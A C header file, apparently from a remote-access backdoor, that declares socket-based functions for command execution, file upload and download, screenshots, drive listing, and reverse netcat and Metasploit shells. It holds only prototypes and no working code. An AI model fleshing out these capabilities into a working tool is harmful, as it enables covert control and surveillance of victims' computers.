#pragma once
#include "socket.h"
#include "process.h"
#include "misc.h"
#include <ShlObj.h>

/**
 *
 * 命令执行相关的操作
 * 麦当
 * 2022/3/8
 *
**/

// 发送当前路径
void SendPath(SOCKET sServer);
// 执行命令
void ExecCmd(SOCKET sServer, char cmd[]);
// 发送cmd执行后的结果
void SendCmdResult(SOCKET sServer, char cmd[]);
// 获取时间戳
void GetTimestamp(char str[]);
// 切换路径
BOOL ChangePath(char cmd[]);
// 下载文件
BOOL Download(SOCKET sServer, char cmd[]);
// 上传文件
BOOL Upload(SOCKET sServer, char cmd[]);
// 反弹NC
BOOL NC(SOCKET sServer, char cmd[]);
// 屏幕截图
BOOL ScreenShot(char path[]);
// 截屏命令
BOOL Screen(SOCKET sServer,char cmd[]);
// 磁盘命令
BOOL Drive(SOCKET sServer, char cmd[]);
// 反弹msf
BOOL MSF(SOCKET sServer, char cmd[]);
// 获取pid
BOOL GetPID(SOCKET sServer, char cmd[]);
// 帮助菜单
BOOL Help(char cmd[]);

